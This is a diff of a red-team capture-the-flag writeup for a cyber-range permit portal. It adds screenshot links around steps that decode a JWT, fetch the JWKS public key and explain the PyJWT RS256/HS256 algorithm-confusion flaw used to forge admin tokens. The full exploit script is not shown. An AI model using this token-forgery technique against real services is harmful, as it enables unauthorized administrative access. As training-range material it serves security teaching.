@@ -1,4 +1,4 @@
-# solve_red.md — M1 · ext-permit-portal
+<img width="2007" height="807" alt="image" src="https://github.com/user-attachments/assets/8732be91-75db-4acc-976c-1345966fea68" /># solve_red.md — M1 · ext-permit-portal
 ## Red Team Solution Writeup
 **Range:** RNG-EXT-01 · SETU DVAAR · OPERATION DEEPSTRIKE
 **Machine:** M1 — RPAL Exploration Permit Portal
@@ -157,7 +157,9 @@ curl -s -X POST http://203.x.x.x:8443/login \
 TOKEN=$(grep rpal_token /tmp/cookies.txt | awk '{print $NF}')
 echo "Token: ${TOKEN:0:60}..."
 ```
-<img width="2015" height="735" alt="image" src="https://github.com/user-attachments/assets/aaacbc69-8121-4c50-b089-0d672363fdaf" />
+
+<img width="2025" height="721" alt="image" src="https://github.com/user-attachments/assets/0ac5dd2c-4cbc-4848-8f19-feba825d153b" />
+
 
 
 **Decode the JWT header — this reveals the algorithm and kid:**
@@ -180,6 +182,8 @@ echo "$TOKEN" | cut -d. -f1 |   python3 -c "import sys,base64,json;   d=sys.stdi
 ```bash
 echo "$TOKEN" | cut -d. -f2 |   python3 -c "import sys,base64,json;   d=sys.stdin.read().strip();   d+='='*(4-len(d)%4);   print(json.dumps(json.loads(base64.urlsafe_b64decode(d)),indent=2))"
 ```
+<img width="1245" height="271" alt="image" src="https://github.com/user-attachments/assets/563e64bf-740d-486c-a91e-7f4c3c0df35a" />
+
 
 ```json
 {
@@ -190,6 +194,11 @@ echo "$TOKEN" | cut -d. -f2 |   python3 -c "import sys,base64,json;   d=sys.stdi
   "exp": 1731667200
 }
 ```
+
+<img width="1996" height="224" alt="image" src="https://github.com/user-attachments/assets/2aef48b2-c449-436b-a199-2173950ddbf4" />
+
+
+
 
 **Key observations:**
 1. Algorithm is `RS256` — asymmetric, signed with RSA private key
@@ -205,6 +214,9 @@ This strongly indicates a JWKS endpoint. Try the standard well-known path:
 # Standard OIDC/JWKS well-known path — try it directly
 curl -s http://203.x.x.x:8443/.well-known/jwks.json | python3 -m json.tool
 ```
+
+<img width="2037" height="407" alt="image" src="https://github.com/user-attachments/assets/3e012ce8-375b-4bde-8639-da61f220296c" />
+
 
 **Expected response:**
 ```json
@@ -253,6 +265,8 @@ echo "$TOKEN" | cut -d. -f1 | base64 -d 2>/dev/null | python3 -m json.tool
   "typ": "JWT"
 }
 ```
+<img width="2007" height="227" alt="image" src="https://github.com/user-attachments/assets/7cadc3a0-4e73-4b29-92d3-6c1c3fb26907" />
+
 
 **Decode payload:**
 ```bash
@@ -270,6 +284,8 @@ echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool
   "jti": "abc123..."
 }
 ```
+<img width="2037" height="280" alt="image" src="https://github.com/user-attachments/assets/47e124cd-c19e-4bca-b854-4978aea0bca4" />
+
 
 **Why this matters:**
 Now you know the exact claim structure. To forge an admin token, you need:
@@ -291,6 +307,7 @@ decoded = jwt.decode(
     algorithms=['RS256', 'HS256'],   # Both algorithms accepted
 )
 ```
+
 
 When PyJWT 1.7.1 processes a token with `alg: HS256`:
 1. It reads `alg: HS256` from the token header
@@ -464,6 +481,9 @@ print("\n[+] Exploitation complete. Proceed to M2.")
 ```bash
 python3 /tmp/jwt_confusion_exploit.py
 ```
+
+<img width="1103" height="537" alt="image" src="https://github.com/user-attachments/assets/410d5194-d328-4b5b-9b92-fa6f56c7e6b3" />
+
 
 ### 3.2 — Manual JWT Construction (No Python Required)
 
